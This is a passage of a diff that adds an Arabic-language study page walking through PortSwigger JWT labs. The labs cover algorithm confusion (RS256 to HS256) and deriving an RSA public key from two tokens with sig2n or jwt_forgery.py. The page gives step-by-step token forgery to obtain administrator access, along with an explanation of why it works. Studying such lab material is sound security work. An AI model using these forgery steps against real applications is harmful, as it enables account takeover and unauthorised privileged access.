+</code></pre>
+<p>وحط الـ JWK.</p>
+<hr />
+<h1 id="3-pem-public-key">3) استخرج الـ PEM Public Key</h1>
+<p>Right Click على الـ RSA Key:</p>
+<pre><code>Copy Public Key as PEM
+</code></pre>
+<p>هيطلع:</p>
+<pre><code>-----BEGIN PUBLIC KEY-----...-----END PUBLIC KEY-----
+</code></pre>
+<hr />
+<h1 id="4-base64-encode-pem">4) اعمل Base64 Encode للـ PEM</h1>
+<p>روح:</p>
+<pre><code>Decoder
+</code></pre>
+<p>واعمل:</p>
+<pre><code>Base64 Encode
+</code></pre>
+<hr />
+<h1 id="5-symmetric-key">5) اعمل Symmetric Key</h1>
+<p>روح:</p>
+<pre><code>JWT Editor Keys→ New Symmetric Key→ Generate
+</code></pre>
+<hr />
+<h1 id="_19">⚠️ ملاحظة مهمة جدًا</h1>
+<p>بعد ما تعمل الـ Symmetric Key لازم تعدل:</p>
+<pre><code>&quot;k&quot;
+</code></pre>
+<p>وتحط فيه:</p>
+<pre><code>Base64 encoded PEM public key
+</code></pre>
+<p>يعني تستبدل القيمة القديمة بالكامل.</p>
+<p>مثال:</p>
+<pre><code>{  &quot;kty&quot;: &quot;oct&quot;,  &quot;kid&quot;: &quot;pem_public&quot;,  &quot;k&quot;: &quot;LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0K...&quot;}
+</code></pre>
+<p>لو ما عملتش الخطوة دي:</p>
+<ul>
+<li>الـ signature هيبقى غلط</li>
+<li>والسيرفر هيرجع Unauthorized</li>
+</ul>
+<hr />
+<h1 id="6-jwt">6) عدل الـ JWT</h1>
+<h2 id="header">Header</h2>
+<p>غير:</p>
+<pre><code>&quot;alg&quot;:&quot;RS256&quot;
+</code></pre>
+<p>إلى:</p>
+<pre><code>&quot;alg&quot;:&quot;HS256&quot;
+</code></pre>
+<hr />
+<h2 id="payload">Payload</h2>
+<p>غير:</p>
+<pre><code>&quot;sub&quot;:&quot;wiener&quot;
+</code></pre>
+<p>إلى:</p>
+<pre><code>&quot;sub&quot;:&quot;administrator&quot;
+</code></pre>
+<hr />
+<h1 id="7-sign">7) اعمل Sign</h1>
+<p>اضغط:</p>
+<pre><code>Sign
+</code></pre>
+<p>واختار الـ Symmetric Key.</p>
+<hr />
+<h1 id="8">8) مهم جدًا</h1>
+<p>اختار:</p>
+<pre><code>Don't modify header
+</code></pre>
+<hr />
+<h1 id="9">9) ابعت الريكوست</h1>
+<p>لو كل حاجة صح:</p>
+<ul>
+<li>هيديك Admin Access</li>
+<li>وتكمل اللاب عادي.</li>
+</ul>
+<hr />
+<h1 id="attack">سبب نجاح الـ Attack</h1>
+<p>السيرفر:</p>
+<ul>
+<li>وثق في قيمة:</li>
+</ul>
+<pre><code>&quot;alg&quot;:&quot;HS256&quot;
+</code></pre>
+<p>فبدل ما يتحقق بـ RSA:</p>
+<ul>
+<li>استخدم الـ public key كـ HMAC secret.</li>
+</ul>
+<p>وإنت استخدمت نفس الـ public key للتوقيع.</p>
+<p>فالـ signature بقى valid.</p>
+<hr />
+<h3 id="deriving-public-keys-from-existing-tokens">Deriving Public Keys from Existing Tokens :</h3>
+<p>[^8]</p>
+<p>[^8]: الفكرة هنا:<br />
+    أحيانًا السيرفر <strong>مش بيعرض الـ public key</strong> في:</p>
+<pre><code>```
+/jwks.json
+```
+
+فساعتها بنستخرجه من JWTs موجودة بالفعل.
+
+---
+
+# الفكرة الرياضية ببساطة
+
+لو عندك:
+
+- توكن 1
+- توكن 2
+
+ومتوقعين بـ:
+
+```
+RS256
+```
+
+فالتوقيع RSA بيحتوي معلومات رياضية تقدر منها تستنتج:
+
+```
+n
+```
+
+اللي هو جزء أساسي من الـ RSA public key.
+
+---
+
+# الـ RSA Public Key بيتكون من ايه؟
+
+غالبًا:
+
+```
+{  "kty":"RSA",  "e":"AQAB",  "n":"..."}
+```
+
+أهم قيمة هنا:
+
+```
+n
+```
+
+---
+
+# الأداة المستخدمة
+
+اسمها:
+
+```
+sig2n
+```
+
+أو:
+
+```
+jwt_forgery.py
+```
+
+---
+
+# تشغيل الأداة
+
+بتجيب:
+
+- JWT 1
+- JWT 2
+
+ثم:
+
+```
+docker run --rm -it portswigger/sig2n &lt;token1&gt; &lt;token2&gt;
+```
+
+---
+
+# الأداة بتعمل ايه؟
+
+بتطلعلك:
+
+- احتمالات مختلفة للـ public key
+- بصيغة PEM
+- وكمان JWTs مزورة جاهزة
+
+---
+
+# ليه احتمالات متعددة؟
+
+لأن الرياضيات بتطلع:
+
+```
+عدة قيم محتملة للـ n
+```
+
+لكن:
+
+- واحدة بس هي الصح
+- والباقي غلط
+
+---
+
+# تعرف الصح ازاي؟
+
+الأداة بتديك:
+
+```
+forged JWTs
+```
+
+جاهزين.
+
+كل اللي عليك:
+
+- تبعت كل توكن في Repeater
+- تشوف مين المقبول
+
+---
+
+# لو السيرفر قبله؟
+
+يبقى:
+
+- الـ public key المرتبط بالتوكن ده هو الصح
+
+---
+
+# بعد كده تعمل ايه؟
+
+تستخدم الـ public key ده في:
+
+```
+Algorithm Confusion Attack
+```
+
+يعني:
+
+- تحول RS256 → HS256
+- وتوقّع بالـ public key
+
+---
+
+# الفكرة العملية كاملة
+
+## عندك:
+
+### Token 1
+
+```
+eyJhbGciOiJSUzI1NiJ9....
+```
+
+### Token 2
+
+```
+eyJhbGciOiJSUzI1NiJ9....
+```
+
+---
+
+# تشغل:
+
+```
+docker run --rm -it portswigger/sig2n token1 token2
+```
+
+---
+
+# يطلعلك:
+
+```
+Candidate key #1Candidate key #2Candidate key #3
+```
+
+ومع كل واحد:
+
+- PEM
+- forged JWT
+
+---
+
+# تجرب الـ forged JWTs
+
+في Burp Repeater.
+
+---
+
+# واحد بس هيشتغل
+
+وده معناه:
+
+```
+هذا هو الـ public key الحقيقي
+```
+
+---
+
+# بعدين
+
+تعمل:
+
+- New Symmetric Key
+- تحط الـ PEM Base64 في:
+
+```
+"k"
+```
+
+ثم:
+
+- alg → HS256
+- Sign
+- Done ✅
+
+---
+
+# ليه الهجوم ده خطير؟
+
+لأن حتى لو السيرفر:
+
+- مخبي الـ public key
+
+تقدر أحيانًا:
+
+- تستخرجه من التوقيعات نفسها.
+
+وده يخليك تعمل:
+
+```
+Full JWT Forgery
+```
+</code></pre>
+<hr />
+<h2 id="public-key-algorithm-confusion-attack">شرح أدوات استخراج الـ Public Key وعمل Algorithm Confusion Attack :</h2>
+<p><a href="هنشرح:">^9</a></p>
+<pre><code>1. تثبيت Docker
+2. تشغيل sig2n
+3. استخدام jwt_forgery.py
+4. فهم الناتج
+5. تنفيذ الـ Attack كامل
+
+---
+
+# أولاً: Tool اسمها sig2n
+
+دي أداة من PortSwigger.
+
+وظيفتها:
+
+- تاخد 2 JWT
+- تستخرج احتمالات الـ RSA Public Key
+- تولد JWTs مزورة جاهزة
+
+---
+
+# ليه محتاجينها؟
+
+لأن أحيانًا:
+
+```
+/jwks.json
+```
+
+مش موجود.
+
+فمفيش public key واضح.
+
+فساعتها نستخرجه من:
+
+- توقيع JWT 1
+- توقيع JWT 2
+
+---
+
+# تثبيت Docker
+
+## Windows
+
+نزل:  
+[Docker Desktop](https://www.docker.com/products/docker-desktop/?utm_source=chatgpt.com)
+
+---
+
+## بعد التثبيت
+
+افتح:
+
+```
+CMD
+```
+
+وجرب:
+
+```
+docker --version
+```
+
+لو ظهر:
+
+```
+Docker version ...
+```
+
+يبقى تمام.
+
+---
+
+# استخدام sig2n
+
+## الصيغة
+
+```
+docker run --rm -it portswigger/sig2n &lt;token1&gt; &lt;token2&gt;
+```
+
+---
+
+# مثال
+
+```
+docker run --rm -it portswigger/sig2n eyJhbGciOiJSUzI1NiJ9.... eyJhbGciOiJSUzI1NiJ9....
+```
+
+---
+
+# الأداة بتعمل ايه؟
+
+بتحسب:
+
+```
+RSA modulus (n)
+```
+
+من التوقيعات.
+
+---
+
+# الناتج
+
+هيطلعلك:
+
+```
+Candidate 1Candidate 2Candidate 3
+```
+
+---
+
+# كل Candidate يحتوي على:
+
+## 1) PEM Public Key
+
+مثلاً:
+
+```
+-----BEGIN PUBLIC KEY-----MIIBIjANBg...-----END PUBLIC KEY-----
+```
+
+---
+
+## 2) Forged JWT
+
+توكن مزور جاهز.
+
+---
+
+# تجرب التوكنات
+
+في:
+
+```
+Burp Repeater
+```
+
+---
+
+# واحد فقط هيشتغل
+
+وده معناه:
+
+```
+هذا هو الـ Public Key الصحيح
+```
+
+---
+
+# بعد ما تعرف الـ Key الصح
+
+تبدأ تعمل:
+
+```
+Algorithm Confusion Attack
+```
+
+---
+
+# Tool الثانية: jwt_forgery.py
+
+دي سكربت Python.
+
+نفس الفكرة تقريبًا.
+
+---
+
+# تحميل الأداة
+
+من:  
+[rsa_sign2n GitHub](https://github.com/silentsignal/rsa_sign2n?utm_source=chatgpt.com)
+
+---
+
+# تثبيت
+
+## Linux / Kali
+
+```
+git clone https://github.com/silentsignal/rsa_sign2n.git
+```
+
+---
+
+## ادخل الفولدر
+
+```
+cd rsa_sign2n
+```
+
+---
+
+# تثبيت dependencies
+
+```
+pip install -r requirements.txt
+```
+
+---
+
+# تشغيل الأداة
+
+```
+python jwt_forgery.py &lt;token1&gt; &lt;token2&gt;
+```
+
+---
+
+# الناتج
+
+- احتمالات public keys
+- forged JWTs
+
+زي sig2n بالظبط.
+
+---
+
+# الفرق بين sig2n و jwt_forgery.py
+
+|Tool|أسهل|يحتاج تثبيت|
+|---|---|---|
+|sig2n|✅|Docker فقط|
+|jwt_forgery.py|أصعب شوية|Python + dependencies|
+
+---
+
+# تنفيذ الـ Attack بعد استخراج الـ Public Key
+
+---
+
+# 1) خد الـ PEM
+
+مثلاً:
+
+```
+-----BEGIN PUBLIC KEY-----...-----END PUBLIC KEY-----
+```
+
+---
+
+# 2) Base64 Encode
+
+في Burp Decoder:
+
+```
+Encode as Base64
+```
+
+---
+
+# 3) اعمل Symmetric Key
+
+في:
+
+```
+JWT Editor Keys→ New Symmetric Key
+```
+
+---
+
+# 4) أهم خطوة ⚠️
+
+استبدل:
+
+```
+"k"
+```
+
+بالـ:
+
+```
+Base64 encoded PEM
+```
+
+---
+
+# مثال
+
+```
+{  "kty":"oct",  "kid":"pem_public",  "k":"LS0tLS1CRUdJTiBQVUJMSUMgS0VZ..."}
+```
+
+---
+
+# 5) عدل الـ JWT
+
+## Header
+
+```
+{  "alg":"HS256",  "typ":"JWT"}
+```
+
+---
+
+# 6) عدل الـ Payload
+
+مثلاً:
+
+```
+{  "sub":"administrator"}
+```
+
+---
+
+# 7) Sign
+
+اضغط:
+
+```
+Sign
+```
+
+واختار الـ Symmetric Key.
+
+---
+
+# 8) اختار
+
+```
+Don't modify header
+```
+
+---
+
+# 9) Send
+
+لو Vulnerable:
+
+- هتاخد admin access ✅
+
+---
+
+# ملخص الفكرة كلها
+
+## السيرفر الطبيعي
+
+```
+RS256
+```
+
+- Private key للتوقيع
+- Public key للتحقق
+
+---
+
+# الـ Bug
+
+السيرفر يثق في:
+
+```
+"alg":"HS256"
+```
+
+---
+
+# النتيجة
+
+يستخدم:
+
+```
+Public Key = HMAC Secret
+```
+
+---
+
+# وإنت تستغل ده
+
+- تجيب الـ public key
+- توقّع بيه HS256
+- السيرفر يصدق التوكن 😈
+</code></pre>
+<hr />
+<h1 id="jwt-algorithm-confusion-via-derived-public-key-lab">JWT Algorithm Confusion via Derived Public Key Lab :</h1>
+<h2 id="lab-idea">Lab Idea</h2>
+<p>السيرفر يستخدم <strong>RS256</strong> للتحقق من التوقيع.<br />
+لكن فيه ثغرة Algorithm Confusion تسمح لنا نغيّر الخوارزمية إلى <strong>HS256</strong> ونوقّع التوكن باستخدام الـ <strong>Public Key كـ HMAC Secret</strong>.</p>
+<p>في اللاب ده الـ Public Key مش متاح، فبنستخرجه من <strong>JWTs موجودة بالفعل</strong>.</p>
+<hr />
+<h1 id="goal">🎯 Goal</h1>
+<p>الحصول على Admin access عن طريق:</p>
+<ul>
+<li>استخراج RSA Public Key من توكنين</li>
+<li>تحويل الهجوم إلى HS256</li>
+<li>توقيع توكن مزور</li>
+</ul>
+<hr />
+<h1 id="tools-used">⚙️ Tools Used</h1>
+<ul>
+<li>Docker</li>
+<li>sig2n</li>
+<li>Burp Suite (JWT Editor + Repeater)</li>
+<li>Burp Decoder</li>
+</ul>
+<hr />
+<h1 id="step-1-jwts">🪜 Step 1 — استخراج JWTs</h1>
+<p>من التطبيق خذ <strong>2 JWT مختلفة</strong> (بعد تسجيل الدخول مرتين مثلاً).</p>
+<pre><code>token1token2
+</code></pre>
+<hr />
+<h1 id="step-2-docker">🐳 Step 2 — تثبيت Docker</h1>
+<p>تأكد إن Docker شغال:</p>
+<pre><code>docker --version
+</code></pre>
+<hr />
+<h1 id="step-3-public-key-sig2n">🔑 Step 3 — استخراج الـ Public Key باستخدام sig2n</h1>
+<p>شغّل الأمر:</p>
+<pre><code>docker run --rm -it portswigger/sig2n &lt;token1&gt; &lt;token2&gt;
+</code></pre>
+<hr />
+<h2 id="_20">الناتج سيكون:</h2>
+<p>لكل Candidate:</p>
+<ul>
+<li>Public key بصيغة PEM</li>
+<li>Forged JWT جاهزة</li>
+</ul>
+<hr />
+<h1 id="step-4-key">🧪 Step 4 — تحديد الـ Key الصحيح</h1>
+<p>جرّب كل forged JWT في <strong>Burp Repeater</strong>.</p>
+<p>واحد فقط سيعمل بدون Unauthorized.</p>
+<p>👉 هذا هو <strong>Public Key الصحيح</strong>.</p>
+<p>انسخ الـ PEM key.</p>
+<hr />
+<h1 id="step-5-public-key-symmetric-secret">🔄 Step 5 — تحويل الـ Public Key إلى Symmetric Secret</h1>
+<p>افتح Burp → Decoder</p>
+<p>الصق الـ PEM بالكامل:</p>
+<pre><code>-----BEGIN PUBLIC KEY-----...-----END PUBLIC KEY-----
+</code></pre>
+<p>ثم:</p>
+<pre><code>Encode as → Base64
+</code></pre>
+<p>انسخ الناتج.</p>
+<hr />
+<h1 id="_21">⚠️ أهم ملاحظة في اللاب</h1>
+<p>بعد إنشاء <strong>Symmetric Key</strong> في Burp JWT Editor<br />
+لازم تعدّل قيمة:</p>
+<pre><code>&quot;k&quot;
+</code></pre>
+<p>وتضع فيها:</p>
+<pre><code>Base64 encoded PEM
+</code></pre>
+<p>بدون الخطوة دي التوكن هيرجع Unauthorized ❗</p>
+<hr />
+<h1 id="step-6-symmetric-key-burp">🔐 Step 6 — إنشاء Symmetric Key في Burp</h1>
+<p>JWT Editor → Keys → New Symmetric Key</p>
+<p>عدل المفتاح ليصبح:</p>
+<pre><code>{  &quot;kty&quot;: &quot;oct&quot;,  &quot;kid&quot;: &quot;pem_public&quot;,  &quot;k&quot;: &quot;BASE64_ENCODED_PEM_HERE&quot;}
+</code></pre>
+<hr />
+<h1 id="step-7">✏️ Step 7 — تعديل التوكن</h1>
+<h2 id="header_1">Header</h2>
+<p>غيّر الخوارزمية:</p>
+<pre><code>{  &quot;alg&quot;: &quot;HS256&quot;,  &quot;typ&quot;: &quot;JWT&quot;}
+</code></pre>
+<hr />
+<h2 id="payload_1">Payload</h2>
+<p>حوّل المستخدم إلى admin:</p>
+<pre><code>{  &quot;sub&quot;: &quot;administrator&quot;}
+</code></pre>
+<hr />
+<h1 id="step-8-sign">✍️ Step 8 — Sign التوكن</h1>
+<p>في JWT Editor:</p>
+<ul>
+<li>اضغط <strong>Sign</strong></li>
+<li>اختر Symmetric Key</li>
+<li>اختر: <strong>Don't modify header</strong></li>
+</ul>
+<hr />
+<h1 id="step-9">🚀 Step 9 — إرسال التوكن</h1>
+<p>أرسل الطلب بالتوكن الجديد.</p>
+<p>إذا الثغرة موجودة:</p>
+<pre><code>Admin Access Granted ✅
+</code></pre>
+<hr />
+<h1 id="why-this-works">🧩 Why This Works</h1>
+<h2 id="_22">الطبيعي:</h2>
+<p>RS256:</p>
+<ul>
+<li>السيرفر يوقّع بالـ Private Key</li>
+<li>يتحقق بالـ Public Key</li>
+</ul>
+<h2 id="_23">المشكلة:</h2>
+<p>السيرفر يثق في قيمة:</p>
+<pre><code>alg
+</code></pre>
+<p>فعند تغييرها إلى HS256:</p>
+<ul>
+<li>السيرفر يستخدم Public Key كأنه HMAC Secret</li>
+<li>نقوم نحن بالتوقيع بنفس المفتاح</li>
+<li>السيرفر يصدق التوكن</li>
+</ul>
+<hr />
+<h1 id="final-summary">🏁 Final Summary</h1>
+<ol>
+<li>استخرج JWTs</li>
+<li>استخدم sig2n لاستخراج Public Key</li>
+<li>جرّب forged tokens لتحديد المفتاح الصحيح</li>
+<li>Base64 encode للـ PEM</li>
+<li>أنشئ Symmetric Key وعدّل قيمة k</li>
+<li>غيّر alg إلى HS256</li>
+<li>وقّع التوكن وأرسل الطلب</li>
+</ol>
+<hr />
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "..", "features": [], "search": "../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "\u062a\u0645 \u0627\u0644\u0646\u0633\u062e \u0627\u0644\u0649 \u0627\u0644\u062d\u0627\u0641\u0638\u0629", "clipboard.copy": "\u0646\u0633\u062e \u0625\u0644\u0649 \u0627\u0644\u062d\u0627\u0641\u0638\u0629", "search.result.more.one": "\u0623\u0643\u062b\u0631 \u0645\u0646 1 \u0641\u064a \u0647\u0630\u0647 \u0627\u0644\u0635\u0641\u062d\u0629", "search.result.more.other": "\u0623\u0643\u062b\u0631 \u0645\u0646 # \u0641\u064a \u0647\u0630\u0647 \u0627\u0644\u0635\u0641\u062d\u0629", "search.result.none": "\u0644\u0627 \u062a\u0648\u062c\u062f \u0646\u062a\u0627\u0626\u062c", "search.result.one": "\u0646\u062a\u0627\u0626\u062c \u0627\u0644\u0628\u062d\u062b \u0645\u0633\u062a\u0646\u062f \u0648\u0627\u062d\u062f", "search.result.other": "\u0646\u062a\u0627\u0626\u062c \u0627\u0644\u0628\u062d\u062b # \u0645\u0633\u062a\u0646\u062f\u0627\u062a", "search.result.placeholder": "\u0627\u0643\u062a\u0628 \u0644\u0628\u062f\u0621 \u0627\u0644\u0628\u062d\u062b", "search.result.term.missing": "\u0645\u0641\u0642\u0648\u062f", "select.version": "\u0625\u062e\u062a\u0631 \u0627\u0644\u0625\u0635\u062f\u0627\u0631"}, "version": null}</script>
+    
+    
+      <script src="../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  </body>
+</html>
